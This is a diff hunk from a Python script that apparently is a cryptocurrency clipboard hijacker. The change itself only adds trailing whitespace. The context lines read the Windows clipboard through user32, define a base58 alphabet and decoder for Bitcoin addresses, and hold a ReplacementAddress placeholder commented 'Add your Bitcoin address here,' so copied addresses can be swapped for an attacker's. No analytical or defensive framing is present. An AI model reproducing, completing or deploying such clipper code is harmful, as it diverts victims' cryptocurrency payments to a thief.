@@ -25,7 +25,7 @@ user32 = ctypes.windll.user32
 user32.GetClipboardData.restype = ctypes.c_void_p
 digits58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
 
-ReplacementAddress = "YOUR ADDRESS HERE" #<Add your Bitcoin address here.
+ReplacementAddress = "YOUR ADDRESS HERE" #<Add your Bitcoin address here. 
 
 def decode_base58(bc, length):
     n = 0
